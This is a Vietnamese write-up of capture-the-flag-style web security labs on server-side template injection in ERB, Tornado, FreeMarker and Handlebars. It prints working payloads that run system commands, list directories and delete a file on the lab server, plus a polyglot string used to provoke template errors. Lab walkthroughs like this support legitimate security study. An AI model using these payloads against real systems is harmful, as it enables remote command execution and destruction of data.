## Lab: Basic server-side template injection

Trang web này đang sử dụng template là ERB

![Alt text](image.png)

Thử bấm vô views detail cái đầu tiên, bắn ra 1 cái message ở query string parameter.

![Alt text](image-1.png)

Trước tiên thì ta cần phải biết syntax của ERB, trông khá giống EJS 

![](image-2.png)

Thử inject `<%= 7*7 %>`
![](image-3.png)

![](image-4.png)

=> SSTI

`<%= system("whoami") %>`

Vậy ta có user hiện tại là carlos

![Alt text](image-5.png)

Ta dùng `<%= Dir.entries('/') %>` để liệt kê tất cả các folder hiện tại

![Alt text](image-6.png)

Đã tìm ra file morale.txt, giờ chỉ cần remove đi là được.

![Alt text](image-7.png)

`<%= system("rm /home/carlos/morale/txt") %>`

## Lab: Basic server-side template injection (code context)

![Alt text](image-8.png)

Ta dùng {{ 7*7 }} để xem kết quả

![Alt text](image-9.png)

Quay trở lại trang account, khi ta submit name:

![](image-10.png)

![Alt text](image-11.png)

Giờ thử điền thêm vài kí tự vào user.name để xem lỗi

=> template: tornado

![Alt text](image-12.png)

Ta import os, sau đó check user-> carlos

![Alt text](image-13.png)

Vậy là payload đã được execute, ta hình dung được file được render là:

`{{user.name}} {% import os %} {{os.system('whoami')}}`

## Lab: Server-side template injection using documentation

![Alt text](image-14.png)

Template: Freemaker

![Alt text](image-15.png)

![Alt text](image-16.png)

Như vậy là done

![Alt text](image-17.png)

## Lab: Server-side template injection in an unknown language with a documented exploit

Đầu tiên bấm vào view details -> message    

![Alt text](image-18.png)

Ta truyền 1 chuỗi kí tự: `${{<%[%'"}}%\` mục đích nhằm bắn ra error để biết được template

![Alt text](image-19.png)

Ở đây là handlebars của nodejs